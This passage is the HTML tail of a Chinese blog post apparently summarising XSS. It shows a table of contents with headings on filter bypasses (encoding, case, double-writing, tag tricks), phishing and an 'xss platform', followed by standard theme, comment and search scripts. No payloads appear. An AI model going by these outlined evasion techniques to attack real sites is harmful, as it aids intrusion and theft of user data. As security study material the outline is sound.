href="#%EF%BC%88%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">&#96;&#96;（空格绕过）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">()括号绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-text">标签绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5"><span class="toc-text">字符拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%AD%97%E7%AC%A6%E6%B7%B7%E6%B7%86"><span class="toc-text">其它字符混淆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-text">钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%A8%E5%88%AB%E5%9F%9F%E5%90%8D"><span class="toc-text">辨别域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flash%E9%92%93%E9%B1%BC"><span class="toc-text">flash钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-platform"><span class="toc-text">xss platform</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+  
+
+</div>
+
+
+<!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <!-- Custom Files side begin -->
+  
+  <!-- Custom Files side end -->
+</aside>
+
+
+
+          <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<pjax>
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  pdata.commentConfig={};
+  //  see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs
+  
+    // header
+    var l_header=document.getElementById("l_header");
+    
+    l_header.classList.add("show");
+    
+    
+      // cover
+      var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
+      var scroll_down=document.getElementById('scroll-down');
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
+      scroll_down.style.display="none";
+    
+  
+</script>
+</pjax>
+        </div>
+        
+  
+  <footer class="footer clearfix"  itemscope itemtype="http://schema.org/WPFooter">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper" itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer" itemprop="url">
+                
+              </a>
+            
+          
+            
+              <a href="mailto:2098028704@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer" itemprop="url">
+                
+              </a>
+            
+          
+            
+              <a href="https://github.com/mujietongxue"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer" itemprop="url">
+                
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2017-2021 XXX</a></p>
+
+        </div>
+      
+    
+    <!-- Custom Files footer begin-->
+    
+    <!-- Custom Files footer end-->
+  </footer>
+
+
+        <a id="s-top" class="fa-solid fa-arrow-up fa-fw" href="/" onclick="return false;" title="top"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+  /******************** volantis.dom ********************************/
+  // 页面选择器 将dom对象缓存起来 see: /source/js/app.js etc.
+  volantis.dom.bodyAnchor = volantis.dom.$(document.getElementById("safearea")); // 页面主体
+  volantis.dom.topBtn = volantis.dom.$(document.getElementById('s-top')); // 向上
+  volantis.dom.wrapper = volantis.dom.$(document.getElementById('wrapper')); // 整个导航栏
+  volantis.dom.coverAnchor = volantis.dom.$(document.querySelector('#l_cover .cover-wrapper')); // 1个
+  volantis.dom.switcher = volantis.dom.$(document.querySelector('#l_header .switcher .s-search')); // 搜索按钮   移动端 1个
+  volantis.dom.header = volantis.dom.$(document.getElementById('l_header')); // 移动端导航栏
+  volantis.dom.search = volantis.dom.$(document.querySelector('#l_header .m_search')); // 搜索框 桌面端 移动端 1个
+  volantis.dom.mPhoneList = volantis.dom.$(document.querySelectorAll('#l_header .m-phone .list-v')); //  手机端 子菜单 多个
+</script>
+
+<script>
+  
+  volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fortawesome/fontawesome-free/css/all.min.css");
+  
+  
+  
+</script>
+
+<!-- required -->
+
+
+<!-- internal -->
+
+<script src="/js/app.js"></script>
+
+
+
+
+
+
+<!-- rightmenu要在darkmode之前（ToggleButton） darkmode要在comments之前（volantis.dark.push）-->
+
+
+
+<script>
+  function loadIssuesJS() {
+    
+      const sites_api = document.getElementById('sites-api');
+      if (sites_api != undefined && typeof SitesJS === 'undefined') {
+        volantis.js("/js/plugins/tags/sites.js")
+      }
+    
+    
+      const friends_api = document.getElementById('friends-api');
+      if (friends_api != undefined && typeof FriendsJS === 'undefined') {
+        volantis.js("/js/plugins/tags/friends.js")
+      }
+    
+    
+      const contributors_api = document.getElementById('contributors-api');
+      if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
+        volantis.js("/js/plugins/tags/contributors.js")
+      }
+    
+  };
+  loadIssuesJS()
+  volantis.pjax.push(()=>{
+    loadIssuesJS();
+  })
+
+</script>
+
+
+
+
+  <script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/vanilla-lazyload/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: ["#"],
+	maxRPS: 6,
+	hoverDelay: 0
+  };
+</script>
+<script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/flying-pages/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+      <script>
+  volantis.layoutHelper("comments",`<div id="giscus_container"></div>`)
+
+  volantis.giscus = {};
+
+  function check_giscus() {
+    if (volantis.dark.mode === "dark") {
+      volantis.giscus.Theme = 'dark';
+    } else {
+      volantis.giscus.Theme = 'light';
+    }
+
+    return document.getElementById("giscus_container");
+  }
+
+  function pjax_giscus() {
+    const HEAD = check_giscus();
+    if (!HEAD) return;
+    let cfg = Object.assign({"theme":{"light":"light","dark":"dark"},"repo":"mujietongxue/comments","repo-id":"R_kgDOMWKOpA","category":"Announcements","category-id":"DIC_kwDOMWKOpM4Cgx5o","mapping":"pathname","reactions-enabled":"1","emit-metadata":"0","lang":"zh-CN"},pdata.commentConfig)
+    const script = document.createElement('script');
+    script.setAttribute('src', 'https://giscus.app/client.js');
+    Object.keys(cfg).forEach(k=>{
+      if (k != "theme") {
+        script.setAttribute('data-'+k, cfg[k]);
+      }
+    })
+    script.setAttribute('data-theme', volantis.giscus.Theme);
+    script.setAttribute('crossorigin', "anonymous");
+    HEAD.appendChild(script);
+  }
+
+  function dark_giscus() {
+    const HEAD = check_giscus();
+    if (!HEAD) return;
+
+    const message = {
+      setConfig: {
+        theme: volantis.giscus.Theme
+      }
+    };
+    const giscusIframe = document.querySelector('iframe.giscus-frame');
+    giscusIframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+  }
+  pjax_giscus();
+  volantis.pjax.push(pjax_giscus);
+  volantis.dark.push(dark_giscus);
+</script>
+
+    
+
+
+
+
+
+<!-- optional -->
+
+  <script>
+  const SearchServiceDataPathRoot = ("/" || "/").endsWith("/") ?
+    "/" || "/" :
+    "//" || "/";
+  const SearchServiceDataPath = SearchServiceDataPathRoot + "content.json";
+
+  function loadSearchScript() {
+    // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
+    return volantis.js("/js/search/hexo.js");
+  }
+
+  function loadSearchService() {
+    loadSearchScript();
+    document.querySelectorAll(".input.u-search-input").forEach((e) => {
+      e.removeEventListener("focus", loadSearchService, false);
+    });
+
+    document.querySelectorAll(".u-search-form").forEach((e) => {
+      e.addEventListener("submit", (event) => {
+        event.preventDefault();
+      }, false);
+    });
+  }
+
+  // 打开并搜索 字符串 s
+  function OpenSearch(s) {
+    if (typeof SearchService === 'undefined')
+      loadSearchScript().then(() => {
+        SearchService.setQueryText(s);
+        SearchService.search();
+      });
+    else {
+      SearchService.setQueryText(s);
+      SearchService.search();
+    }
+  }
+
+  // 访问含有 ?s=xxx  的链接时打开搜索 // 与搜索引擎 structured data 相关: /scripts/helpers/structured-data/lib/config.js
+  if (window.location.search && /^\?s=/g.test(window.location.search)) {
+    let queryText = decodeURI(window.location.search)
+      .replace(/\ /g, "-")
+      .replace(/^\?s=/g, "");
+    OpenSearch(queryText);
+  }
+
+  // 搜索输入框获取焦点时加载搜索
+  document.querySelectorAll(".input.u-search-input").forEach((e) => {
+    e.addEventListener("focus", loadSearchService, false);
+  });
+</script>
+
+
+
+
+
+
+
+  <script>
+
+
+
+  function pjax_highlightjs_copyCode(){
+    if (!(document.querySelector(".highlight .code pre") ||
+      document.querySelector(".article pre code"))) {
+      return;
+    }
+    VolantisApp.utilCopyCode(".highlight .code pre, .article pre code")
+  }
+  volantis.requestAnimationFrame(pjax_highlightjs_copyCode)
+  volantis.pjax.push(pjax_highlightjs_copyCode)
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  <script>
+  function load_swiper() {
+    if (!document.querySelectorAll(".swiper-container")[0]) return;
+    volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.css");
+    volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    volantis.swiper = new Swiper('.swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+    });
+  }
+
+  volantis.pjax.push(() => {
+    if (!document.querySelectorAll(".swiper-container")[0]) return;
+    if (typeof volantis.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+
+
+<!-- pjax 标签必须存在于所有页面 否则 pjax error -->
+<pjax>
+
+</pjax>
+
+<script>
+  function listennSidebarTOC() {
+    const navItems = document.querySelectorAll(".toc li");
+    if (!navItems.length) return;
+    let targets = []
+    const sections = [...navItems].map((element) => {
+      const link = element.querySelector(".toc-link");
+      const target = document.getElementById(
+        decodeURI(link.getAttribute("href")).replace("#", "")
+      );
+      targets.push(target)
+      // 解除 a 标签 href 的 锚点定位, a 标签 href 的 锚点定位 会随机启用?? 产生错位???
+      link.setAttribute("onclick","return false;")
+      link.setAttribute("toc-action","toc-"+decodeURI(link.getAttribute("href")).replace("#", ""))
+      link.setAttribute("href","/")
+      // 配置 点击 触发新的锚点定位
+      link.addEventListener("click", (event) => {
+        event.preventDefault();
+        // 这里的 addTop 是通过错位使得 toc 自动展开.
+        volantis.scroll.to(target,{addTop: 5, observer:true})
+        // Anchor id
+        history.pushState(null, document.title, "#" + target.id);
+      });
+      return target;
+    });
+
+    function activateNavByIndex(target) {
+      if (target.classList.contains("active-current")) return;
+
+      document.querySelectorAll(".toc .active").forEach((element) => {
+        element.classList.remove("active", "active-current");
+      });
+      target.classList.add("active", "active-current");
+      let parent = target.parentNode;
+      while (!parent.matches(".toc")) {
+        if (parent.matches("li")) parent.classList.add("active");
+        parent = parent.parentNode;
+      }
+    }
+
+    // 方案一：
+    volantis.activateNavIndex=0
+    activateNavByIndex(navItems[volantis.activateNavIndex])
+    volantis.scroll.push(()=>{
+      if (targets[0].getBoundingClientRect().top >= 0) {
+        volantis.activateNavIndex = 0
+      }else if (targets[targets.length-1].getBoundingClientRect().top < 0) {
+        volantis.activateNavIndex = targets.length-1
+      } else {
+        for (let index = 0; index < targets.length; index++) {
+          const target0 = targets[index];
+          const target1 = targets[(index+1)%targets.length];
+          if (target0.getBoundingClientRect().top < 0&&target1.getBoundingClientRect().top >= 0) {
+            volantis.activateNavIndex=index
+            break;
+          }
+        }
+      }
+      activateNavByIndex(navItems[volantis.activateNavIndex])
+    })
+
+    // 方案二：
+    // IntersectionObserver 不是完美精确到像素级别 也不是低延时性的
+    // function findIndex(entries) {
+    //   let index = 0;
+    //   let entry = entries[index];
+    //   if (entry.boundingClientRect.top > 0) {
+    //     index = sections.indexOf(entry.target);
+    //     return index === 0 ? 0 : index - 1;
+    //   }
+    //   for (; index < entries.length; index++) {
+    //     if (entries[index].boundingClientRect.top <= 0) {
+    //       entry = entries[index];
+    //     } else {
+    //       return sections.indexOf(entry.target);
+    //     }
+    //   }
+    //   return sections.indexOf(entry.target);
+    // }
+    // function createIntersectionObserver(marginTop) {
+    //   marginTop = Math.floor(marginTop + 10000);
+    //   let intersectionObserver = new IntersectionObserver(
+    //     (entries, observe) => {
+    //       let scrollHeight = document.documentElement.scrollHeight;
+    //       if (scrollHeight > marginTop) {
+    //         observe.disconnect();
+    //         createIntersectionObserver(scrollHeight);
+    //         return;
+    //       }
+    //       let index = findIndex(entries);
+    //       activateNavByIndex(navItems[index]);
+    //     }, {
+    //       rootMargin: marginTop + "px 0px -100% 0px",
+    //       threshold: 0,
+    //     }
+    //   );
+    //   sections.forEach((element) => {
+    //     element && intersectionObserver.observe(element);
+    //   });
+    // }
+    // createIntersectionObserver(document.documentElement.scrollHeight);
+  }
+
+  document.addEventListener("DOMContentLoaded", ()=>{
+    volantis.requestAnimationFrame(listennSidebarTOC)
+  });
+  document.addEventListener("pjax:success", ()=>{
+    volantis.requestAnimationFrame(listennSidebarTOC)
+  });
+</script>
+
+
+
+<script>
+  document.onreadystatechange = function () {
+    if (document.readyState == 'complete') {
+      // 页面加载完毕 样式加载失败，或是当前网速慢，或是开启了省流模式
+      const { saveData, effectiveType } = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {}
+      if (getComputedStyle(document.querySelector("#safearea"), null)["display"] == "none" || saveData || /2g/.test(effectiveType)) {
+        document.querySelectorAll(".reveal").forEach(function (e) {
+          e.style["opacity"] = "1";
+        });
+        document.querySelector("#safearea").style["display"] = "block";
+      }
+    }
+  }
+</script>
+
+
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"this is my blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/渗透测试/","name":"渗透测试"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/07/28/xss总结/","name":"xss总结"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"blog","url":"http://example.com/","keywords":null,"description":"this is my blog","author":{"@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"this is my blog"},"publisher":{"@type":"Organization","name":"blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"xss总结","description":"this is my blog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/07/28/xss%E6%80%BB%E7%BB%93/"},"author":{"@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/07/28/xss%E6%80%BB%E7%BB%93/","wordCount":0,"datePublished":"2024-07-28T11:06:08.000Z","dateModified":"2024-07-28T14:17:31.875Z","articleSection":"渗透测试","keywords":"web安全,xss","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+
+
+
+      
+        <!--
+  pjax重载区域接口：
+  1.  <pjax></pjax> 标签 pjax 标签必须存在于所有页面 否则 pjax error
+  2.  script[data-pjax]
+  3.  .pjax-reload script
+  4.  .pjax
+-->
+
+
+
+<script src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/pjax/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox]):not([onclick="return false;"]):not([onclick="return!1"]):not([target="_blank"]):not([target="view_window"]):not([href$=".xml"])',
+        selectors: [
+          "head title",
+          "head meta[name=keywords]",
+          "head meta[name=description]",
+          
+          "#l_main",
+          "#pjax-header-nav-list",
+          ".pjax",
+          "pjax", // <pjax></pjax> 标签
+          "script[data-pjax], .pjax-reload script" // script标签添加data-pjax 或 script标签外层添加.pjax-reload 的script代码段重载
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000,
+        
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+      volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+      volantis.pjax.method.complete.start();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      if(volantis.debug) {
+        console.error(e);
+        console.log('pjax error: \n' + JSON.stringify(e));
+      }else{
+        // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+        volantis.pjax.method.error.start();
+        window.location.href = e.triggerElement.href;
+      }
+    });
+</script>
+
+      
+    </div>
+    <!-- import body_end begin-->
+    <!-- import body_end end-->
+    <!-- Custom Files bodyEnd begin-->
+    
+    <!-- Custom Files bodyEnd end-->
+    <!-- front-matter body_end begin -->
+    <!-- front-matter body_end end -->
+  </body>
+</html>
